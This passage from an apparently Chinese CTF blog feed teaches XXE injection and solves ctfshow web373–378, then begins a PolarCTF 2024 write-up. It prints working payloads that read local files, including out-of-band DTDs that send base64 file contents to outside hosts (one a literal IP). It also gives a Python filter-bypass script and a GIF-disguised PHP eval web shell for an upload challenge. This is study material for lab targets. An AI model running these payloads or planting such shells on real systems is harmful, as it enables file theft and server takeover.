class="hljs-meta"> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>  <br>    ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">an-element</span> <span class="hljs-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote-dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> <br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h2 id="三、XXE漏洞利用"><a href="#三、XXE漏洞利用" class="headerlink" title="三、XXE漏洞利用"></a>三、XXE漏洞利用</h2><p>通过对基础知识的理解，我们不难发现可以通过读dtd,将路径换成敏感路径，把敏感路径读取出来</p><h3 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h3><p>由于本人php版本高于7.1需要将代码进行适当的调整，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出所有错误信息</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 临时允许外部实体加载（仅用于测试）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// 获取XML字符串</span><br><span class="hljs-variable">$xmlString</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xml&#x27;</span>];<br><br><span class="hljs-comment">// 解析XML字符串</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$xmlString</span>, <span class="hljs-literal">null</span>, LIBXML_NOENT);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$xml</span> === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to load XML. Errors: &quot;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">libxml_get_errors</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$error</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>, <span class="hljs-variable">$error</span>-&gt;message;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Parsed XML: &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$xml</span>); <span class="hljs-comment">// 使用htmlspecialchars防止XSS</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload进行url编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/%E6%9C%AC%E5%9C%B0%E5%9B%9E%E6%98%BE.png" alt="本地回显"></p><p>由此还可以继续延申，在这种情况下由于没有什么特殊符号，可以顺利读取，那假如有呢</p><p>比如<img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/1.txt.png" alt="1.txt"></p><p>我们再继续尝试看看网页，此时会有一堆报错</p><p>这个时候可以使用<strong>CDATA</strong></p><p>介绍：CDATA节中所有的字符都会被当做元素字符数据的常量部分，而不是xml标记</p><p>因此可以尝试把读出来的数据放在CDATA中输出进行绕过,这里会用到参数实体，payload就不展示了，感兴趣可以自己尝试。</p><h3 id="无回显读取本地文件"><a href="#无回显读取本地文件" class="headerlink" title="无回显读取本地文件"></a>无回显读取本地文件</h3><h4 id="加载远程DTD"><a href="#加载远程DTD" class="headerlink" title="加载远程DTD"></a>加载远程DTD</h4><p>在远程服务器上新建test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br>//%号要进行实体编码成&amp;#x25<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx.xxx/test.dtd&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>讲一下流程：首先先执行%dtd请求远程服务器上的test.dtd,然后执行%payload发送执行%file，最后执行%file获取对方服务器上的敏感文件，替换%send，实现外带</p><p>套用模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE data [<br>&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; <br>%dtd; %all; <br>]&gt; <br>&lt;value&gt;&amp;send;&lt;/value&gt;<br> <br>evil.xml文件内容为<br>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:88%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br>&lt;root&gt;&lt;/root&gt;<br> <br>evil.xml文件内容为：<br>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><h4 id="加载本地DTD"><a href="#加载本地DTD" class="headerlink" title="加载本地DTD"></a>加载本地DTD</h4><p>这种在刷题的时候不太常见，可以参考上面的参考文章使用。</p><h2 id="四、靶机演练"><a href="#四、靶机演练" class="headerlink" title="四、靶机演练"></a>四、靶机演练</h2><h3 id="1-ctfshow-web373"><a href="#1-ctfshow-web373" class="headerlink" title="1.ctfshow web373"></a>1.ctfshow web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>代码大题的意思是读取xml，然后在xml文件中提取ctfshow标签中的内容，随后进行echo</p><p>直接尝试构造就行，有回显的还是挺简单的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/web373.png" alt="web373"></p><h3 id="2-ctfshow-web374"><a href="#2-ctfshow-web374" class="headerlink" title="2.ctfshow web374"></a>2.ctfshow web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>和第一个比较起来，第二个无回显。这个时候需要vps将内容带出来。</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtds</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8888/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    %dtds;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span>    </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">1</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>然后在服务器上传test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://8.130.42.113:5566/%file;&#x27;&gt;&quot;&gt;<br>&lt;!--test.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;<br>%dtd;<br>%showflag;<br><br></code></pre></td></tr></table></figure><p>先用python开端口监听</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png" alt="374-1"></p><p>然后再开端口接收内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png" alt="374-2"></p><p>最后base解密就可以了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png" alt="374-3"></p><p>流程:首先在burpsuite的repeated页面构造最上面的payload，利用参数实体，调用%dtds,获得服务器上的test.dtd,再到dtd中的%dtd中的%showflag,这里注意%需要进行实体编码&amp;#x25，把内容带出到我们开的端口上面，最后得到flag。</p><p>ps:我本地没有配置web服务，所以需要开个http服务，如果有配置的话不需要一些步骤，可以参考其他师傅的wp了解一下。</p><h3 id="3-ctfshow-web375"><a href="#3-ctfshow-web375" class="headerlink" title="3.ctfshow web375"></a>3.ctfshow web375</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:22:05<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure><p>这题和374其实差不多，多了一层验证，判断是否有 ?xml version&#x3D;”1.0”,如果有就会爆error</p><p>和374流程几乎完全一样只是绕过一下，有两种方法</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h4><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/375-1.png" alt="375-1"></p><p>直接去掉就行，会默认是xml文本</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h4><p>这里的判断是对整体的判断，中间多加一个空格就可以进行绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml  version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br></code></pre></td></tr></table></figure><p>其他同374进行</p><h3 id="4-ctfshow-web376"><a href="#4-ctfshow-web376" class="headerlink" title="4.ctfshow web376"></a>4.ctfshow web376</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:23:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br></code></pre></td></tr></table></figure><p>这题比上面多了一层大小写判断，基本没有影响</p><p>就用上面的方法就行</p><p>这里的双引号也可以用单引号进行绕过，不多赘叙</p><h3 id="5-ctfshow-web377"><a href="#5-ctfshow-web377" class="headerlink" title="5.ctfshow web377"></a>5.ctfshow web377</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:26:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure><p>这题比上层多了http的绕过，这题看了师傅的绕法</p><p>正常使用的是utf-8，我们可以编码为utf-16或者utf-32来进行python发包</p><p>直接上payload，这些题目基本是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://0197db2a-c2a9-49f9-8823-3868d3a6ae77.challenge.ctf.show/&#x27;</span><br>payload=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE hacker[    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">    &lt;!ENTITY % dtds SYSTEM &quot;http://vps:8888/test.dtd&quot;&gt;</span><br><span class="hljs-string">    %dtds;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&lt;/root&gt;&quot;&quot;&quot;</span><br>payload=payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br><span class="hljs-built_in">print</span>(requests.post(url,data=payload).text)<br></code></pre></td></tr></table></figure><h3 id="6-ctfshow-web378"><a href="#6-ctfshow-web378" class="headerlink" title="6.ctfshow web378"></a>6.ctfshow web378</h3><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378.png" alt="378"></p><p>f12看看源码定位到了一行</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">contentType:</span> <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span><br></code></pre></td></tr></table></figure><p>那就是xxe无回显的题目了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-1.png" alt="378-1"></p><p>简单分析一下，url&#x2F;doLogin下面进行xxe利用，得到flag,构造username和password</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-2.png" alt="378-2"></p><p>得到flag</p><p>还有的例题可以参照我的litctf2024和polarctf2024夏，分别有道考察xxe方面的题目</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>以上是我对xxe的浅层次的学习，虽然题目都不算太难，但也算能入个门了，暂时就到这了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Polarctf2024夏</title>
    <link href="/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>前言:比赛并没有参加，趁着复习期末写题目放松一会，学习学习知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>典型的一句话木马，按照流程来就行</p><p>直接上传一个图片，不能直接连接成功，试着传入htaccess限定只能上传图片那些，那估计就是改图片为php就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload.png" alt="upload"></p><p>然后蚁剑连一下就可以了</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload1.png" alt="upload1"></p><p>疑惑：我尝试用jpg上传的时候改末尾并不能成功，看官p用的gif，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>按道理也应该正常执行的，并不是很理解。</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">no no no! &lt;?php<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br><br>if (isset($_GET[&#x27;xxs&#x27;])) &#123;<br>    $input = $_GET[&#x27;xxs&#x27;];<br><br>    if (is_array($input)) &#123;<br>        die(&quot;错误：输入类型不允许为数组。&quot;);<br>    &#125;<br>    if (!preg_match(&quot;/^0e[0-9]+$/&quot;, md5($input))) &#123;<br>        die(&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;);<br>    &#125;<br>    if (!is_numeric($input)) &#123;<br>        die(&quot;错误：输入必须是数字。&quot;);<br>    &#125;<br><br>    die(&quot;恭喜：&quot;.$flag);<br>&#125; else &#123;<br>    